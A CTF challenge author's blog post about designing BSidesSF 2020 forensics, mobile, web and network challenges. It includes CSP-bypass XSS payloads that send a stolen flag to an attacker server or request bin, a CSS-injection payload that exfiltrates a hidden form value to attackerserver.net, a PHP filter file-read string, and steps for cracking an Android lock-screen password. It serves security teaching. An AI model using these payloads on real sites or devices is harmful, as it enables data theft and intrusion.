# :locked_with_key: Challenge writer POV: BSidesSF 2020 CTF

> **Original Source:** [Challenge writer POV: BSidesSF 2020 CTF](https://itsc0rg1.medium.com/challenge-writer-pov-bsidessf-2020-ctf-ea84980b8d79)
> **Platform:** itsc0rg1.medium.com | **Category:** `CRYPTO` | **Year:** 2020

---

# Challenge writer POV: BSidesSF 2020 CTF


Following the tradition of the past [few](https://medium.com/@itsc0rg1/my-mobile-challenge-and-bsides-sf-ctf-f9fc4dfca60) [years](https://medium.com/@itsc0rg1/bsidessf-ctf-challenge-write-up-part-1-e849bc917d37), here is this year’s writeup for my challenges. Unlike previous years where I (almost) exclusively wrote mobile challenges, this year I tried my hand at writing web challenges. Web challenges proved to be a lot easier to write than mobile because I didn’t have to grapple with Java and Android idiosyncrasies.


The primary focus for all my challenges was making them fun and applicable in the real world. I modeled them after bug bounty reports or issues I had seen first-hand. I did cheat a little by re-using a couple of CSP challenges that I had written for the [Blackhoodie class](https://www.slideshare.net/nragupathy/introduction-to-web-application-security-blackhoodie-us-2018) I co-teach with [jmkeads@](https://twitter.com/jmkeads?lang=en).


The rest of this post will outline how / why I chose to write these challenges and what I was hoping to convey. If you are more interested in a walk-through I suggest checking out the [writeups](https://ctftime.org/event/977/tasks/)on CTF Time.

### Forensics: Eavesdropper


I’ve always wanted to design a challenge that required interacting with a physical object. My initial idea was to record touch tones for a digital lock or safe and have participants open it on-site. Given that [Matir@](https://twitter.com/matir) and [Bmenrigh@](https://twitter.com/bmenrigh) had interactive lockpicking challenges in-store, I decided to try a different route. [IAmMandatory@](https://twitter.com/IAmMandatory) suggested that I use Twilio and have participants dial a number to receive the flag. I loved this idea and was able to implement it fairly quickly thanks to Twilio’s [comprehensive documentation.](https://www.twilio.com/docs/voice/quickstart/python)


I used a mobile application to produce the touch tones and wrote a simple [Flask App](https://github.com/BSidesSF/ctf-2020-release/blob/master/eavesdropper/challenge/answer_phone.py) for the Twilio handlers. Participants were given an audio recording of a call where the pin was entered, they had to decode it and call the number listed. Once they entered the right pin (965312), the system would read out the flag (ctf{dtmf_is_awesome}).


One thing I hadn’t considered was international call charges, sorry about that!

### Mobile / Forensics: Open-Sesame


For this challenge participants were given an Android Virtual Device Image and had to crack the device password using the rockyou password list. This was inspired by [Sam Bowne’s challenge](https://samsclass.info/128/proj/p12xpw.htm) which was catered to older versions of Android.


Newer versions of Android don’t store the password as a salted hash in */data/system/password.key* with the salt in */data/system/locksettings.db* (as outlined in [[1](https://samsclass.info/128/proj/p12xpw.htm)] and [[2](https://forensics.spreitzenbarth.de/2012/02/28/cracking-pin-and-password-locks-on-android/)]). Instead they use [Gatekeeper](https://source.android.com/security/authentication/gatekeeper), which stores it as an HMAC in* /data/system/gatekeeper.password.key*. The type of credential used to secure the lock screen can be determined by examining the *locksettings.db* file, as outlined below —

>

adb root


adb shell


generic_x86_64:/ # cd /data/system


generic_x86_64:/data/system # sqlite3 lock


locksettings.db locksettings.db-shm locksettings.db-wal


generic_x86_64:/data/system # sqlite3 locksettings.db


SQLite version 3.18.2 2017–07–21 07:56:09


Enter “.help” for usage hints.


sqlite> .tables


android_metadata locksettings


sqlite> select * from locksettings;


4|lockscreen.password_type_alternate|0|0


…..


8|lockscreen.password_salt|0|3926817817791309287


20|lockscreen.disabled|0|1


21|lockscreen.password_type|0|262144


22|lockscreen.profilechallenge|0|1


23|lockscreen.passwordhistory|0|


The value of the *password_type* field — [262144](https://developer.android.com/reference/android/app/admin/DevicePolicyManager) — reveals that the password is alphabetic with some symbols. To optimize the next step, you can drop all entries from the rockyou list that contain numbers. But before we can get cracking, we need to understand the structure of *gatekeeper.password.key*, which contains the salt and HMAC of the password. The bytes are as follows -


- Metadata: 17 bytes

- Salt: 8 bytes

- Signature: 32 bytes


I found a python script which did most of the heavy lifting ([https://github.com/Vxer-Lee/AndroidPin-Crack](https://github.com/Vxer-Lee/AndroidPin-Crack)), and modified it to include a [function to crack passphrases](https://github.com/BSidesSF/ctf-2020-release/blob/master/open-sesame/solution/solution.py). Participants could pull the *gatekeeper.password.key* file from */data/system/* using *adb* (as root) and then bruteforce the password (lifeinchinatown).


Given that there aren’t many resources online discussing the format of device password storage for newer versions of Android, I figured this challenge would be hard but rewarding to solve. In hindsight considering that only one team solved it, I should have chosen a smaller wordlist or made an easier version with a numeric pin instead.

### Web: CSP Challenges


CSP has gained notoriety in security, both for and against it. It isn’t a cure-all for XSS issues, but is a good safety net when escaping fails. I really enjoy looking through the solutions people come up with for the , “The shortest XSS Payload” challenges, but I didn’t want to impose a length restriction. I also wanted people to write working payloads, since we often stop at alert(1)s which don’t demonstrate the impact of an XSS vulnerability. These challenges required the participants to identify a CSP bypass and craft a payload which would steal the flag.


I rendered the payloads in the result page to allow participants to debug them, in the background these were sent to [Matir@](https://twitter.com/matir)’s webbot which ran them in a headless chrome instance with the admin cookies. One thing I did mess up, was not encoding the payloads being passed, thankfully [iAmMandatory@](https://twitter.com/IAmMandatory) spotted that and fixed it.


The first challenge was fairly straightforward

>

content-security-policy: script-src ‘self’ data:; default-src ‘self’; connect-src *; report-uri /csp_report


This can be bypassed using [data URLs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs), like so —

>

<script src=”data:text/javascript;base64,YWxlcnQoMSk7"> </script>


The second is a re-hash of [HS5C’s mini-challenge 3](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22), a quick shout-out to Cure53’s XSS challenge Wiki which has a great collection of payloads for past challenges. The CSP policy that had to be bypassed was,

>

content-security-policy: script-src ‘self’ ajax.googleapis.com ‘unsafe-eval’; default-src ‘self’ ‘unsafe-inline’; connect-src *; report-uri /csp_report


Some of the previously identified bypasses no longer work due to changes to googleapis.com, so participants who found the wiki would first need to find a working payload. Then they would need to modify it to make an XHR request, I ended up modifying this payload —

>

“ng-app ng-csp><base href=//ajax.googleapis.com/ajax/libs/><script src=angularjs/1.0.1/angular.js></script><script src=prototype/1.7.2.0/prototype.js></script>{{$on.curry.call().alert(1337


to,

>

<script src=”[https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.js](https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.js)"></script><script src=”[https://ajax.googleapis.com/ajax/libs/prototype/1.7.2.0/prototype.js](https://ajax.googleapis.com/ajax/libs/prototype/1.7.2.0/prototype.js)"></script><div id=”f” ng-app ng-csp ng-click=”x=$on.curry.call()”>{{x.eval(x.atob(“dmFyIHhociA9…VGV4dCwgdHJ1ZSk7cmVxdWVzdC5zZW5kKCl9O3hoci5zZW5kKG51bGwpOw==”))}}aaa</div><script async src=”[https://ajax.googleapis.com/jsapi?callback=f.click](https://ajax.googleapis.com/jsapi?callback=f.click)"></script>


where the base64 string is an XHR request to request bin with the flag as a parameter. It is a bit of an eyesore but uses quotes minimally. As the CTF organizer, I get to look at the submissions and learn from them. I personally like this one by [NekochanNano!](https://szarny.hatenablog.com/#Web--51pts-csp-2)—

>

<script src=”//ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js”></script>
<div class=”ng-app”> {{ constructor.constructor(‘fetch(“[https://csp-2-2446d5a3.challenges.bsidessf.net/csp-two-flag](https://csp-2-2446d5a3.challenges.bsidessf.net/csp-two-flag)").then(r=>r.text()).then(t=>fetch("YOUR_SERVER"+t))')() }} </div>


The third challenge is my personal favorite and really captures the difficulty of configuring CSP correctly. The CSP policy looks fairly tame,

>

content-security-policy:
script-src ‘self’ [http://storage.googleapis.com/good.js](http://storage.googleapis.com/good.js);
default-src ‘self’;
connect-src *;
report-uri /csp_report


In fact this would be safe, if it weren’t for the ability to arbitrarily redirect to any page using /redirect (disclosed through robots.txt). In order to prevent leaking path information cross-origin, CSP will ignore the path component if the resource is loaded through a redirect (outlined in spec [here](https://www.w3.org/TR/CSP3/#source-list-paths-and-redirects), explained by Lukas, Michele [here](https://www.slideshare.net/LukasWeichselbaum/breaking-bad-csp)). Participants could host their payload on a GCS bucket and then source it through the redirect —

>

<script src=”[https://csp-3-05637e51.challenges.bsidessf.net/redirect?url=https://storage.googleapis.com/<bucket-name>/payload.js](https://csp-3-05637e51.challenges.bsidessf.net//redirect?url=https%3A%2F%2Fstorage.googleapis.com%2Fbsidessfniru%2Fpayload.js)"></script>


If you enjoyed these challenges and are interested in diving deeper into the world of CSP, I highly recommend following [we1x@](https://twitter.com/we1x) and [mikispag@’s](https://twitter.com/mikispag) work. Particularly, their tool [CSP evaluator](https://csp-evaluator.withgoogle.com/) which is a great resource for reviewing CSP policies.

### Web: Fun with Flags


Yes, the name of the challenge was inspired by Big Bang Theory :) The challenge itself was inspired by [d0nutptr@’](https://twitter.com/d0nutptr)s write-up on[exfiltrating hidden form fields using the general and adjacent sibling selectors](https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d).


I took this opportunity to get acquainted with Flask Frameworks like Flask-Login, WTForms and designed the challenge to mimic a real world application. The initial idea was to have participants steal the CSRF token, alas the built-in CSRF token was fairly long and would have taken a while to exfil :( Rather than alter the standard implementation, I introduced another hidden form field.


Participants had to send a message to the admin to bruteforce the value of the hidden form field and exfiltrate it using CSS. The page’s CSP allowed images to be sourced from any location and unsafe-inline for styles, allowing for an attack like this —

>

<style>
input[name=flag][value^=CTF] ~ * {
background-image: url(“[http://attackerserver.net?flag=CTF](http://enpo9ryf4m5oj.x.pipedream.net/?flag=CTF){");
}
</style>


I used bleach to strip out all tags except <style> to ensure I didn’t inadvertently introduce other injection venues. Teams were able to solve this fairly quickly using PoCs by d0nutpt@ / [sirdarkcat@.](https://twitter.com/sirdarckcat) One subtlety I caught while implementing this challenge was that a visible element needed to follow the hidden form field for this attack to work (confirmed by d0nut [here](https://twitter.com/d0nutptr/status/1232175013240791040?s=20)). Given that sensitive hidden fields like CSRF tokens are usually placed before the submit button by most frameworks, this attack should have a reasonably high success rate.

### Web: Had a bad day


I wanted a twist on the standard PHP Local File Inclusion (LFI), having the flag in a PHP file meant it needed to be read not just included. PHP filters can be used to read the file, like so —

>

php://filter/convert.base64-encode/resource=index


But won’t work here, since there is a basic check for presence of “woofers” / “index” / “meowers”. So, tweaking it a bit would give us —

>

php://filter/convert.base64-encode/write=woofers/resource=flag


This type of check is something I’ve run into while testing web applications and was fun to incorporate in a challenge. And, I finally had an excuse to browse through cute dog and cat pictures, not that I needed one :D

### Mobile: Toast Clicker Challenges


I’ll keep this section fairly short since the challenges were similar to past years. I wrote a simple cookie clicker application, except with a slice of Toast since Android’s popups are called [Toast](https://developer.android.com/guide/topics/ui/notifiers/toasts). Thankfully my terrible sense of humor didn’t take away from the challenge. I was able to hide three flags,


- First Flag: In the Java code, in the form of an Array of ASCII codes shifted by the index.

- Second Flag: Stored in encrypted form in a JNI file, the key was split in three parts across the build config, resource file and the JNI file itself.

- Third Flag: Was in a .dex file that was pulled from a GCS bucket and dynamically loaded by the application. I encoded the flag using Bacon cipher, because I was hungry…


Having three stages in the same application saved a lot of implementation time, since I didn’t need to develop a separate mobile application for each of them. I really liked the dynamic code loading mechanism and will be revisiting it for a future challenge (hint for folks who will be playing next year).

### Network: Bulls-23


This one was based on[iagox@’s](https://twitter.com/iagox86) idea and a joint effort with [iAmMandatory@](https://twitter.com/IAmMandatory). We wanted people to look through the provided pcap using Wireshark’s websocket filter, find the password for the telnet user michaeljordan and use it to log in.


We proxied telnet over websockets using [websockify](https://github.com/novnc/websockify), which also has a [telnet client](https://github.com/novnc/websockify-js/blob/master/wstelnet.html) which we used for testing. I wrote the initial prototype and brushed up on linux configurations for login (or no login). [iAmMandatory@](https://twitter.com/IAmMandatory) did most of the heavy lifting including dockerizing it and programatically creating the network traffic for the pcap.


Overall, it was fun to setup and showed how websockets could be used to expose non-web services or as C2 transport.

### Closing Thoughts


I had a lot of fun writing these challenges and learning from them. Be it while developing them or through participant write-ups. The web challenges, particularly the CSP ones, were very well received and will make a reappearance next year :) I will also be devoting significant time to designing 101 web challenges for next year.


If you have any suggestions or feedback for my challenges, feel free to reach me at [itsc0rg1@](https://twitter.com/itsC0rg1). Thanks for playing this year and I hope to see you again next time!

---

*Originally published on [Medium](https://itsc0rg1.medium.com/challenge-writer-pov-bsidessf-2020-ctf-ea84980b8d79). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of crypto CTF writeups.*
